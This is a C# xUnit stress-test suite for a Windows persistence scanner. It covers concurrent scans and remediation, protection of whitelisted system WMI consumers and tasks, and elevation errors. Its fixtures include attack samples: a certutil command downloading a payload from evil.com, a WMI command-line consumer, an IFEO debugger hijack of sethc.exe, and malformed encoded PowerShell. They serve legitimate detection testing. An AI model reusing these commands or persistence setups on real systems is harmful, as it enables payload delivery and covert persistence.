// ─────────────────────────────────────────────────────────────────────────────
// LogicFlow.Tests — PersistenceScannerEngineEmpiricalStressTests
// Empirical Challenger 2 Stress Test Suite:
// Concurrency, Thread Safety, Whitelist Enforcement, and Security/Access Errors
// ─────────────────────────────────────────────────────────────────────────────

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using LogicFlow.Sentinel;
using Microsoft.Win32;
using Moq;
using Xunit;

namespace LogicFlow.Tests;

public class PersistenceScannerEngineEmpiricalStressTests
{
    #region Thread-Safe Mock Implementations

    private class ThreadSafeRegistryService : IPersistenceRegistryService
    {
        private readonly ConcurrentDictionary<string, object> _values = new(StringComparer.OrdinalIgnoreCase);
        private readonly ConcurrentDictionary<string, HashSet<string>> _subKeys = new(StringComparer.OrdinalIgnoreCase);
        public bool ThrowUnauthorizedAccess { get; set; }
        public bool ThrowSecurityException { get; set; }

        private static string ValKey(RegistryHive h, RegistryView v, string sub, string val) => $"{h}_{v}_{sub}_{val}";
        private static string SubKey(RegistryHive h, RegistryView v, string sub) => $"{h}_{v}_{sub}";

        public void AddSubKey(RegistryHive hive, RegistryView view, string parentSubKey, string subKeyName)
        {
            _subKeys.AddOrUpdate(
                SubKey(hive, view, parentSubKey),
                _ => new HashSet<string>(StringComparer.OrdinalIgnoreCase) { subKeyName },
                (_, set) => { lock (set) { set.Add(subKeyName); } return set; });
        }

        public void SetString(RegistryHive hive, RegistryView view, string subKey, string valueName, string value)
        {
            CheckThrows();
            _values[ValKey(hive, view, subKey, valueName)] = value;
        }

        public void SetDword(RegistryHive hive, RegistryView view, string subKey, string valueName, int value)
        {
            CheckThrows();
            _values[ValKey(hive, view, subKey, valueName)] = value;
        }

        public string? GetString(RegistryHive hive, RegistryView view, string subKey, string valueName)
        {
            CheckThrows();
            return _values.TryGetValue(ValKey(hive, view, subKey, valueName), out var val) ? val as string : null;
        }

        public int? GetDword(RegistryHive hive, RegistryView view, string subKey, string valueName)
        {
            CheckThrows();
            if (_values.TryGetValue(ValKey(hive, view, subKey, valueName), out var val))
            {
                if (val is int i) return i;
                if (val is string s && int.TryParse(s, out var parsed)) return parsed;
            }
            return null;
        }

        public void DeleteValue(RegistryHive hive, RegistryView view, string subKey, string valueName)
        {
            CheckThrows();
            _values.TryRemove(ValKey(hive, view, subKey, valueName), out _);
        }

        public void DeleteSubKeyTree(RegistryHive hive, RegistryView view, string subKey)
        {
            CheckThrows();
            _subKeys.TryRemove(SubKey(hive, view, subKey), out _);
        }

        public string[] GetSubKeyNames(RegistryHive hive, RegistryView view, string subKey)
        {
            CheckThrows();
            if (_subKeys.TryGetValue(SubKey(hive, view, subKey), out var set))
            {
                lock (set)
                {
                    return set.ToArray();
                }
            }
            return Array.Empty<string>();
        }

        public IReadOnlyDictionary<string, object> GetValues(RegistryHive hive, RegistryView view, string subKey)
        {
            CheckThrows();
            var result = new Dictionary<string, object>(StringComparer.OrdinalIgnoreCase);
            string prefix = SubKey(hive, view, subKey) + "_";
            foreach (var kvp in _values)
            {
                if (kvp.Key.StartsWith(prefix, StringComparison.OrdinalIgnoreCase))
                {
                    string vName = kvp.Key.Substring(prefix.Length);
                    result[vName] = kvp.Value;
                }
            }
            return result;
        }

        private void CheckThrows()
        {
            if (ThrowUnauthorizedAccess) throw new UnauthorizedAccessException("Simulated unauthorized registry access.");
            if (ThrowSecurityException) throw new SecurityException("Simulated registry security exception.");
        }
    }

    private class ThreadSafeWmiService : IWmiSubscriptionService
    {
        public List<WmiEventConsumerInfo> Consumers { get; } = new();
        public List<WmiEventFilterInfo> Filters { get; } = new();
        public List<WmiBindingInfo> Bindings { get; } = new();
        public ConcurrentBag<string> DeletedBindings { get; } = new();
        public ConcurrentBag<string> DeletedConsumers { get; } = new();
        public ConcurrentBag<string> DeletedFilters { get; } = new();
        public bool ThrowUnauthorizedAccess { get; set; }

        public List<WmiEventConsumerInfo> GetConsumers()
        {
            if (ThrowUnauthorizedAccess) throw new UnauthorizedAccessException("Simulated WMI access denied.");
            lock (Consumers) return new List<WmiEventConsumerInfo>(Consumers);
        }

        public List<WmiEventFilterInfo> GetFilters()
        {
            if (ThrowUnauthorizedAccess) throw new UnauthorizedAccessException("Simulated WMI access denied.");
            lock (Filters) return new List<WmiEventFilterInfo>(Filters);
        }

        public List<WmiBindingInfo> GetBindings()
        {
            if (ThrowUnauthorizedAccess) throw new UnauthorizedAccessException("Simulated WMI access denied.");
            lock (Bindings) return new List<WmiBindingInfo>(Bindings);
        }

        public void DeleteBinding(string consumerName, string filterName)
        {
            if (ThrowUnauthorizedAccess) throw new UnauthorizedAccessException("Simulated WMI access denied.");
            DeletedBindings.Add($"{consumerName}|{filterName}");
        }

        public void DeleteConsumer(string consumerName)
        {
            if (ThrowUnauthorizedAccess) throw new UnauthorizedAccessException("Simulated WMI access denied.");
            DeletedConsumers.Add(consumerName);
        }

        public void DeleteFilter(string filterName)
        {
            if (ThrowUnauthorizedAccess) throw new UnauthorizedAccessException("Simulated WMI access denied.");
            DeletedFilters.Add(filterName);
        }
    }

    private class ThreadSafeScheduledTaskService : IScheduledTaskService
    {
        public List<ScheduledTaskInfo> Tasks { get; } = new();
        public ConcurrentBag<string> DeletedTasks { get; } = new();
        public bool ThrowUnauthorizedAccess { get; set; }

        public Task<List<ScheduledTaskInfo>> QueryTasksAsync(CancellationToken ct = default)
        {
            if (ThrowUnauthorizedAccess) throw new UnauthorizedAccessException("Simulated Task query access denied.");
            lock (Tasks) return Task.FromResult(new List<ScheduledTaskInfo>(Tasks));
        }

        public Task<bool> DeleteTaskAsync(string taskName, CancellationToken ct = default)
        {
            if (ThrowUnauthorizedAccess) throw new UnauthorizedAccessException("Simulated Task delete access denied.");
            DeletedTasks.Add(taskName);
            return Task.FromResult(true);
        }
    }

    private class ThreadSafeFileSystemProvider : IFileSystemProvider
    {
        public ConcurrentDictionary<string, long> Files { get; } = new(StringComparer.OrdinalIgnoreCase);
        public ConcurrentBag<string> DeletedFiles { get; } = new();
        public bool ThrowUnauthorizedAccess { get; set; }

        public bool FileExists(string path) => Files.ContainsKey(path);
        public bool DirectoryExists(string path) => true;

        public string[] GetFiles(string path, string searchPattern, SearchOption searchOption)
        {
            if (ThrowUnauthorizedAccess) throw new UnauthorizedAccessException("Simulated FS access denied.");
            return Files.Keys.Where(k => k.StartsWith(path, StringComparison.OrdinalIgnoreCase)).ToArray();
        }

        public FileInfo? GetFileInfo(string path) => FileExists(path) ? new FileInfo(path) : null;

        public void DeleteFile(string path)
        {
            if (ThrowUnauthorizedAccess) throw new UnauthorizedAccessException("Simulated FS delete access denied.");
            if (Files.TryRemove(path, out _))
            {
                DeletedFiles.Add(path);
            }
        }

        public long GetFileLength(string path) => Files.TryGetValue(path, out var len) ? len : 0;
        public DateTime GetCreationTime(string path) => DateTime.UtcNow;
    }

    #endregion

    #region Suite 1: Concurrency & Thread Safety Stress Tests

    [Fact]
    public async Task ScanAsync_ConcurrentStress_50ParallelCalls_ConsistentAndDeterministicResults()
    {
        // Arrange
        var registry = new ThreadSafeRegistryService();
        var wmi = new ThreadSafeWmiService();
        var taskService = new ThreadSafeScheduledTaskService();
        var processProvider = new Mock<IProcessProvider>();
        var fileSystem = new ThreadSafeFileSystemProvider();
        var sigValidator = new Mock<IDigitalSignatureValidator>();

        // Populate baseline threats across all 4 vectors
        wmi.Consumers.Add(new WmiEventConsumerInfo
        {
            Name = "ParallelMaliciousConsumer",
            ConsumerType = "CommandLineEventConsumer",
            CommandLineTemplate = "cmd.exe /c start parallel_evil.exe"
        });
        wmi.Filters.Add(new WmiEventFilterInfo
        {
            Name = "ParallelFilter",
            Query = "SELECT * FROM Win32_ProcessStartTrace"
        });
        wmi.Bindings.Add(new WmiBindingInfo
        {
            ConsumerName = "ParallelMaliciousConsumer",
            FilterName = "ParallelFilter"
        });

        taskService.Tasks.Add(new ScheduledTaskInfo
        {
            TaskName = @"\Test\ParallelLolbasTask",
            TaskToRun = "certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\Temp\\payload.exe",
            HasSecurityDescriptor = true
        });

        registry.AddSubKey(RegistryHive.LocalMachine, RegistryView.Registry64,
            @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options", "sethc.exe");
        registry.SetString(RegistryHive.LocalMachine, RegistryView.Registry64,
            @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe", "Debugger", @"C:\Evil\cmd.exe");

        processProvider.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>());
        sigValidator.Setup(s => s.ValidateSignature(It.IsAny<string>())).Returns(SignatureValidationResult.Unsigned());

        var engine = new PersistenceScannerEngine(registry, wmi, taskService, processProvider.Object, fileSystem, sigValidator.Object);

        // Act: Execute 50 concurrent scans simultaneously
        const int concurrency = 50;
        var tasks = Enumerable.Range(0, concurrency)
            .Select(_ => Task.Run(async () => await engine.ScanAsync()))
            .ToArray();

        var reports = await Task.WhenAll(tasks);

        // Assert: Every report has identical threat counts and zero anomalies
        Assert.Equal(concurrency, reports.Length);
        foreach (var report in reports)
        {
            Assert.NotNull(report);
            Assert.False(report.RequiresElevation);
            Assert.True(report.ThreatCount >= 3, $"Expected >= 3 threats but found {report.ThreatCount}");
            Assert.Contains(report.Threats, t => t.Category == "WMI Persistence");
            Assert.Contains(report.Threats, t => t.Category == "LOLBAS Scheduled Task");
            Assert.Contains(report.Threats, t => t.Category == "IFEO Hijack");
        }
    }

    [Fact]
    public async Task RemediateEntryAsync_ConcurrentStress_50MixedParallelRemediations_ThreadSafeExecution()
    {
        // Arrange
        var registry = new ThreadSafeRegistryService();
        var wmi = new ThreadSafeWmiService();
        var taskService = new ThreadSafeScheduledTaskService();
        var processProvider = new Mock<IProcessProvider>();
        var fileSystem = new ThreadSafeFileSystemProvider();
        var sigValidator = new Mock<IDigitalSignatureValidator>();

        var engine = new PersistenceScannerEngine(registry, wmi, taskService, processProvider.Object, fileSystem, sigValidator.Object);

        // Create 50 distinct entries across all target types
        var entries = new List<PersistenceEntry>();
        for (int i = 0; i < 10; i++)
        {
            entries.Add(new PersistenceEntry
            {
                Id = $"wmi_{i}",
                Category = "WMI Persistence",
                Name = $"RogueConsumer_{i}",
                TargetType = "WMI",
                AdditionalData = $"RogueConsumer_{i}|RogueFilter_{i}"
            });
            entries.Add(new PersistenceEntry
            {
                Id = $"task_{i}",
                Category = "LOLBAS Scheduled Task",
                Name = $"RogueTask_{i}",
                Location = $@"\CustomTasks\RogueTask_{i}",
                TargetType = "Task",
                AdditionalData = $@"\CustomTasks\RogueTask_{i}"
            });
            entries.Add(new PersistenceEntry
            {
                Id = $"ifeo_{i}",
                Category = "IFEO Hijack",
                Name = $"Hook_{i}",
                TargetType = "IFEO",
                AdditionalData = $"custom_app_{i}.exe|Registry64"
            });
            entries.Add(new PersistenceEntry
            {
                Id = $"appinit_{i}",
                Category = "DLL Injection",
                Name = $"AppInit_{i}",
                TargetType = "AppInit"
            });
            string filePath = $@"C:\Temp\malicious_{i}.exe";
            fileSystem.Files[filePath] = 2048;
            entries.Add(new PersistenceEntry
            {
                Id = $"file_{i}",
                Category = "Unsigned Staged Binary",
                Name = $"malicious_{i}.exe",
                Location = filePath,
                TargetType = "File",
                AdditionalData = filePath
            });
        }

        // Act: Remediate all 50 entries concurrently
        var remediationTasks = entries.Select(entry => Task.Run(async () => await engine.RemediateEntryAsync(entry))).ToArray();
        var results = await Task.WhenAll(remediationTasks);

        // Assert: All 50 remediations succeeded
        Assert.Equal(50, results.Length);
        Assert.All(results, r => Assert.True(r.Success, $"Remediation failed: {r.Message} (TargetId: {r.TargetId})"));
        Assert.Equal(10, wmi.DeletedConsumers.Count);
        Assert.Equal(10, taskService.DeletedTasks.Count);
        Assert.Equal(10, fileSystem.DeletedFiles.Count);
    }

    [Fact]
    public async Task InterleavedScanAndRemediate_50ConcurrentOperations_ZeroDeadlocksOrExceptions()
    {
        // Arrange
        var registry = new ThreadSafeRegistryService();
        var wmi = new ThreadSafeWmiService();
        var taskService = new ThreadSafeScheduledTaskService();
        var processProvider = new Mock<IProcessProvider>();
        var fileSystem = new ThreadSafeFileSystemProvider();
        var sigValidator = new Mock<IDigitalSignatureValidator>();

        processProvider.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>());
        sigValidator.Setup(s => s.ValidateSignature(It.IsAny<string>())).Returns(SignatureValidationResult.Unsigned());

        var engine = new PersistenceScannerEngine(registry, wmi, taskService, processProvider.Object, fileSystem, sigValidator.Object);

        // Act: Run 25 scans and 25 remediations concurrently
        var tasks = new List<Task>();
        for (int i = 0; i < 25; i++)
        {
            tasks.Add(Task.Run(async () => await engine.ScanAsync()));
            int idx = i;
            var entry = new PersistenceEntry
            {
                Id = $"task_interleaved_{idx}",
                Category = "LOLBAS Scheduled Task",
                Name = $"Task_{idx}",
                Location = $@"\Interleaved\Task_{idx}",
                TargetType = "Task",
                AdditionalData = $@"\Interleaved\Task_{idx}"
            };
            tasks.Add(Task.Run(async () => await engine.RemediateEntryAsync(entry)));
        }

        // Wait with a 15-second timeout to assert zero deadlocks
        var allTask = Task.WhenAll(tasks);
        var completedTask = await Task.WhenAny(allTask, Task.Delay(TimeSpan.FromSeconds(15)));

        // Assert
        Assert.Same(allTask, completedTask);
        Assert.True(allTask.IsCompletedSuccessfully);
    }

    [Fact]
    public async Task RemediateAllAsync_BatchStress_100HeterogeneousThreats_ProcessedDeterministically()
    {
        // Arrange
        var registry = new ThreadSafeRegistryService();
        var wmi = new ThreadSafeWmiService();
        var taskService = new ThreadSafeScheduledTaskService();
        var processProvider = new Mock<IProcessProvider>();
        var fileSystem = new ThreadSafeFileSystemProvider();
        var sigValidator = new Mock<IDigitalSignatureValidator>();

        var engine = new PersistenceScannerEngine(registry, wmi, taskService, processProvider.Object, fileSystem, sigValidator.Object);

        var threats = new List<PersistenceThreatItem>();
        for (int i = 0; i < 100; i++)
        {
            threats.Add(new PersistenceThreatItem
            {
                Id = $"batch_threat_{i}",
                Category = "LOLBAS Scheduled Task",
                Name = $"BatchTask_{i}",
                Location = $@"\Batch\Task_{i}",
                TargetType = "Task",
                AdditionalData = $@"\Batch\Task_{i}"
            });
        }

        // Act
        var results = await engine.RemediateAllAsync(threats);

        // Assert
        Assert.Equal(100, results.Count);
        Assert.All(results, r => Assert.True(r.Success));
        Assert.Equal(100, taskService.DeletedTasks.Count);
    }

    #endregion

    #region Suite 2: Whitelist Enforcement & Core OS Protection

    [Theory]
    [InlineData("SCM Event Log Consumer", "SCM Event Log Filter")]
    [InlineData("Kern-CapLifecycle-Consumer", "Kern-CapLifecycle-Filter")]
    [InlineData("BVTConsumer", "BVTFilter")]
    [InlineData("TSLogonConsumer", "TSLogonFilter")]
    [InlineData("RAEventConsumer", "RAEventFilter")]
    public async Task RemediateEntryAsync_SystemWmiConsumers_AllKnownWhitelistedConsumers_Rejected(string consumer, string filter)
    {
        // Arrange
        var registry = new ThreadSafeRegistryService();
        var wmi = new ThreadSafeWmiService();
        var taskService = new ThreadSafeScheduledTaskService();
        var processProvider = new Mock<IProcessProvider>();
        var fileSystem = new ThreadSafeFileSystemProvider();
        var sigValidator = new Mock<IDigitalSignatureValidator>();

        var engine = new PersistenceScannerEngine(registry, wmi, taskService, processProvider.Object, fileSystem, sigValidator.Object);

        var entry = new PersistenceEntry
        {
            Id = $"wmi_{consumer}",
            Category = "WMI Persistence",
            Name = consumer,
            TargetType = "WMI",
            AdditionalData = $"{consumer}|{filter}"
        };

        // Act
        var result = await engine.RemediateEntryAsync(entry);

        // Assert
        Assert.False(result.Success);
        Assert.Contains("protected Windows system", result.Message, StringComparison.OrdinalIgnoreCase);
        Assert.Empty(wmi.DeletedConsumers);
        Assert.Empty(wmi.DeletedBindings);
        Assert.Empty(wmi.DeletedFilters);
    }

    [Theory]
    [InlineData(@"\Microsoft\Windows\Defrag\ScheduledDefrag")]
    [InlineData(@"\Microsoft\Windows\UpdateOrchestrator\Schedule Scan")]
    [InlineData(@"\Microsoft\Windows\DiskCleanup\SilentCleanup")]
    [InlineData(@"\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser")]
    public async Task RemediateEntryAsync_CoreWindowsScheduledTasks_MicrosoftWindowsHierarchy_Rejected(string taskPath)
    {
        // Arrange
        var registry = new ThreadSafeRegistryService();
        var wmi = new ThreadSafeWmiService();
        var taskService = new ThreadSafeScheduledTaskService();
        var processProvider = new Mock<IProcessProvider>();
        var fileSystem = new ThreadSafeFileSystemProvider();
        var sigValidator = new Mock<IDigitalSignatureValidator>();

        var engine = new PersistenceScannerEngine(registry, wmi, taskService, processProvider.Object, fileSystem, sigValidator.Object);

        var entry = new PersistenceEntry
        {
            Id = "core_task",
            Category = "LOLBAS Scheduled Task",
            Name = Path.GetFileName(taskPath),
            Location = taskPath,
            TargetType = "Task",
            AdditionalData = taskPath
        };

        // Act
        var result = await engine.RemediateEntryAsync(entry);

        // Assert
        Assert.False(result.Success);
        Assert.Contains("protected Windows core", result.Message, StringComparison.OrdinalIgnoreCase);
        Assert.Empty(taskService.DeletedTasks);
    }

    [Fact]
    public async Task ScanAsync_StandardCleanWinlogon_ExplorerAndUserinit_ZeroThreatsReported()
    {
        // Arrange
        var registry = new ThreadSafeRegistryService();
        var wmi = new ThreadSafeWmiService();
        var taskService = new ThreadSafeScheduledTaskService();
        var processProvider = new Mock<IProcessProvider>();
        var fileSystem = new ThreadSafeFileSystemProvider();
        var sigValidator = new Mock<IDigitalSignatureValidator>();

        string winlogonPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
        registry.SetString(RegistryHive.LocalMachine, RegistryView.Registry64, winlogonPath, "Shell", "explorer.exe");
        registry.SetString(RegistryHive.LocalMachine, RegistryView.Registry64, winlogonPath, "Userinit", @"C:\Windows\system32\userinit.exe,");

        processProvider.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>());

        var engine = new PersistenceScannerEngine(registry, wmi, taskService, processProvider.Object, fileSystem, sigValidator.Object);

        // Act
        var report = await engine.ScanAsync();

        // Assert
        Assert.Empty(report.Threats.Where(t => t.Category == "Winlogon Hijack"));
    }

    [Fact]
    public async Task ScanAsync_BenignWmiSubscriptions_AllWhitelistedConsumersAndFilters_NeverReportedAsThreats()
    {
        // Arrange
        var registry = new ThreadSafeRegistryService();
        var wmi = new ThreadSafeWmiService();
        var taskService = new ThreadSafeScheduledTaskService();
        var processProvider = new Mock<IProcessProvider>();
        var fileSystem = new ThreadSafeFileSystemProvider();
        var sigValidator = new Mock<IDigitalSignatureValidator>();

        wmi.Consumers.Add(new WmiEventConsumerInfo { Name = "SCM Event Log Consumer", ConsumerType = "NTEventLogEventConsumer" });
        wmi.Consumers.Add(new WmiEventConsumerInfo { Name = "Kern-CapLifecycle-Consumer", ConsumerType = "CommandLineEventConsumer" });
        wmi.Consumers.Add(new WmiEventConsumerInfo { Name = "BVTConsumer", ConsumerType = "CommandLineEventConsumer" });
        wmi.Consumers.Add(new WmiEventConsumerInfo { Name = "TSLogonConsumer", ConsumerType = "CommandLineEventConsumer" });
        wmi.Consumers.Add(new WmiEventConsumerInfo { Name = "RAEventConsumer", ConsumerType = "CommandLineEventConsumer" });

        wmi.Filters.Add(new WmiEventFilterInfo { Name = "SCM Event Log Filter", Query = "SELECT * FROM __InstanceModificationEvent" });
        wmi.Filters.Add(new WmiEventFilterInfo { Name = "Kern-CapLifecycle-Filter", Query = "SELECT * FROM __InstanceCreationEvent" });
        wmi.Filters.Add(new WmiEventFilterInfo { Name = "BVTFilter", Query = "SELECT * FROM __InstanceCreationEvent" });

        wmi.Bindings.Add(new WmiBindingInfo { ConsumerName = "SCM Event Log Consumer", FilterName = "SCM Event Log Filter" });
        wmi.Bindings.Add(new WmiBindingInfo { ConsumerName = "Kern-CapLifecycle-Consumer", FilterName = "Kern-CapLifecycle-Filter" });

        processProvider.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>());

        var engine = new PersistenceScannerEngine(registry, wmi, taskService, processProvider.Object, fileSystem, sigValidator.Object);

        // Act
        var report = await engine.ScanAsync();

        // Assert
        Assert.Empty(report.Threats.Where(t => t.Category == "WMI Persistence"));
    }

    #endregion

    #region Suite 3: SecurityException & UnauthorizedAccessException Handling

    [Fact]
    public async Task ScanAsync_RegistryThrowsUnauthorizedAccessException_FlagsRequiresElevation()
    {
        // Arrange
        var registry = new ThreadSafeRegistryService { ThrowUnauthorizedAccess = true };
        var wmi = new ThreadSafeWmiService();
        var taskService = new ThreadSafeScheduledTaskService();
        var processProvider = new Mock<IProcessProvider>();
        var fileSystem = new ThreadSafeFileSystemProvider();
        var sigValidator = new Mock<IDigitalSignatureValidator>();

        processProvider.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>());

        var engine = new PersistenceScannerEngine(registry, wmi, taskService, processProvider.Object, fileSystem, sigValidator.Object);

        // Act
        var report = await engine.ScanAsync();

        // Assert
        Assert.NotNull(report);
        Assert.True(report.RequiresElevation);
    }

    [Fact]
    public async Task ScanAsync_WmiThrowsUnauthorizedAccessException_FlagsRequiresElevation()
    {
        // Arrange
        var registry = new ThreadSafeRegistryService();
        var wmi = new ThreadSafeWmiService { ThrowUnauthorizedAccess = true };
        var taskService = new ThreadSafeScheduledTaskService();
        var processProvider = new Mock<IProcessProvider>();
        var fileSystem = new ThreadSafeFileSystemProvider();
        var sigValidator = new Mock<IDigitalSignatureValidator>();

        processProvider.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>());

        var engine = new PersistenceScannerEngine(registry, wmi, taskService, processProvider.Object, fileSystem, sigValidator.Object);

        // Act
        var report = await engine.ScanAsync();

        // Assert
        Assert.NotNull(report);
        Assert.True(report.RequiresElevation);
    }

    [Fact]
    public async Task RemediateEntryAsync_RegistryThrowsSecurityException_ReturnsFailWithElevationFlag()
    {
        // Arrange
        var registry = new ThreadSafeRegistryService { ThrowSecurityException = true };
        var wmi = new ThreadSafeWmiService();
        var taskService = new ThreadSafeScheduledTaskService();
        var processProvider = new Mock<IProcessProvider>();
        var fileSystem = new ThreadSafeFileSystemProvider();
        var sigValidator = new Mock<IDigitalSignatureValidator>();

        var engine = new PersistenceScannerEngine(registry, wmi, taskService, processProvider.Object, fileSystem, sigValidator.Object);

        var entry = new PersistenceEntry
        {
            Id = "ifeo_perm",
            Category = "IFEO Hijack",
            Name = "Debugger on utilman.exe",
            TargetType = "IFEO",
            AdditionalData = "utilman.exe|Registry64"
        };

        // Act
        var result = await engine.RemediateEntryAsync(entry);

        // Assert
        Assert.False(result.Success);
        Assert.True(result.RequiresElevation);
        Assert.Contains("Administrative elevation required", result.Message);
    }

    [Fact]
    public async Task RemediateEntryAsync_RegistryThrowsUnauthorizedAccessException_ReturnsFailWithElevationFlag()
    {
        // Arrange
        var registry = new ThreadSafeRegistryService { ThrowUnauthorizedAccess = true };
        var wmi = new ThreadSafeWmiService();
        var taskService = new ThreadSafeScheduledTaskService();
        var processProvider = new Mock<IProcessProvider>();
        var fileSystem = new ThreadSafeFileSystemProvider();
        var sigValidator = new Mock<IDigitalSignatureValidator>();

        var engine = new PersistenceScannerEngine(registry, wmi, taskService, processProvider.Object, fileSystem, sigValidator.Object);

        var entry = new PersistenceEntry
        {
            Id = "appinit_perm",
            Category = "DLL Injection",
            Name = "AppInit Hook",
            TargetType = "AppInit"
        };

        // Act
        var result = await engine.RemediateEntryAsync(entry);

        // Assert
        Assert.False(result.Success);
        Assert.True(result.RequiresElevation);
        Assert.Contains("Administrative elevation required", result.Message);
    }

    [Fact]
    public async Task RemediateEntryAsync_WmiThrowsUnauthorizedAccessException_ReturnsFailWithElevationFlag()
    {
        // Arrange
        var registry = new ThreadSafeRegistryService();
        var wmi = new ThreadSafeWmiService { ThrowUnauthorizedAccess = true };
        var taskService = new ThreadSafeScheduledTaskService();
        var processProvider = new Mock<IProcessProvider>();
        var fileSystem = new ThreadSafeFileSystemProvider();
        var sigValidator = new Mock<IDigitalSignatureValidator>();

        var engine = new PersistenceScannerEngine(registry, wmi, taskService, processProvider.Object, fileSystem, sigValidator.Object);

        var entry = new PersistenceEntry
        {
            Id = "wmi_perm",
            Category = "WMI Persistence",
            Name = "RogueConsumer",
            TargetType = "WMI",
            AdditionalData = "RogueConsumer|RogueFilter"
        };

        // Act
        var result = await engine.RemediateEntryAsync(entry);

        // Assert
        Assert.False(result.Success);
        Assert.True(result.RequiresElevation);
        Assert.Contains("Administrative elevation required", result.Message);
    }

    [Fact]
    public async Task RemediateEntryAsync_TaskServiceThrowsUnauthorizedAccessException_ReturnsFailWithElevationFlag()
    {
        // Arrange
        var registry = new ThreadSafeRegistryService();
        var wmi = new ThreadSafeWmiService();
        var taskService = new ThreadSafeScheduledTaskService { ThrowUnauthorizedAccess = true };
        var processProvider = new Mock<IProcessProvider>();
        var fileSystem = new ThreadSafeFileSystemProvider();
        var sigValidator = new Mock<IDigitalSignatureValidator>();

        var engine = new PersistenceScannerEngine(registry, wmi, taskService, processProvider.Object, fileSystem, sigValidator.Object);

        var entry = new PersistenceEntry
        {
            Id = "task_perm",
            Category = "LOLBAS Scheduled Task",
            Name = "BadTask",
            Location = @"\BadTask",
            TargetType = "Task",
            AdditionalData = @"\BadTask"
        };

        // Act
        var result = await engine.RemediateEntryAsync(entry);

        // Assert
        Assert.False(result.Success);
        Assert.True(result.RequiresElevation);
        Assert.Contains("Administrative elevation required", result.Message);
    }

    #endregion

    #region Suite 4: Adversarial Edge Cases & Resiliency

    [Theory]
    [InlineData("powershell.exe -enc !!!!InvalidBase64!!!!")]
    [InlineData("powershell.exe -encodedcommand A===")]
    [InlineData("powershell.exe -e ")]
    public async Task ScanAsync_CorruptedMalformedPowerShellEncodedPayloads_HandlesGracefully(string malformedAction)
    {
        // Arrange
        var registry = new ThreadSafeRegistryService();
        var wmi = new ThreadSafeWmiService();
        var taskService = new ThreadSafeScheduledTaskService();
        var processProvider = new Mock<IProcessProvider>();
        var fileSystem = new ThreadSafeFileSystemProvider();
        var sigValidator = new Mock<IDigitalSignatureValidator>();

        taskService.Tasks.Add(new ScheduledTaskInfo
        {
            TaskName = @"\Test\MalformedTask",
            TaskToRun = malformedAction,
            HasSecurityDescriptor = true
        });

        processProvider.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>());

        var engine = new PersistenceScannerEngine(registry, wmi, taskService, processProvider.Object, fileSystem, sigValidator.Object);

        // Act & Assert: Should complete without throwing unhandled exceptions
        var report = await engine.ScanAsync();
        Assert.NotNull(report);
    }

    [Fact]
    public async Task RemediateEntryAsync_MalformedAdditionalDataPipes_HandlesGracefully()
    {
        // Arrange
        var registry = new ThreadSafeRegistryService();
        var wmi = new ThreadSafeWmiService();
        var taskService = new ThreadSafeScheduledTaskService();
        var processProvider = new Mock<IProcessProvider>();
        var fileSystem = new ThreadSafeFileSystemProvider();
        var sigValidator = new Mock<IDigitalSignatureValidator>();

        var engine = new PersistenceScannerEngine(registry, wmi, taskService, processProvider.Object, fileSystem, sigValidator.Object);

        var entry = new PersistenceEntry
        {
            Id = "ifeo_empty_pipe",
            Category = "IFEO Hijack",
            Name = "Malformed IFEO",
            TargetType = "IFEO",
            AdditionalData = "|||"
        };

        // Act & Assert: Must not throw IndexOutOfRangeException or ArgumentException
        var result = await engine.RemediateEntryAsync(entry);
        Assert.NotNull(result);
    }

    #endregion
}
